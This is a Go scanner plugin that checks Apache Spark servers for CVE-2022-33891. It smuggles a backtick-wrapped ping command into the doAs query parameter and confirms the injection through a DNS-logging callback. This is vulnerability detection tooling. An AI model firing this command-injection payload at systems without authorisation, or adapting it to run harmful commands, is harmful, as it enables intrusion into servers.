package spark

import (
	"fmt"
	"nscan/plugins/log"
	"nscan/utils"
	"time"
)

func CVE_2022_33891(u string) bool {
	if utils.CeyeApi != "" && utils.CeyeDomain != "" {
		randomstr := utils.RandomStr()
		payload := fmt.Sprintf("doAs=`ping%%20%s`", randomstr+"."+utils.CeyeDomain)
		utils.HttpRequset(u+"/jobs/?"+payload, "GET", "", false, nil)
		time.Sleep(3 * time.Second)
		if utils.Dnslogchek(randomstr) {
			log.Logger.Warn().Msg(fmt.Sprintf("Found vuln Apache Spark CVE_2022_33891|%s\n", u))
			return true
		}
	}
	return false
}
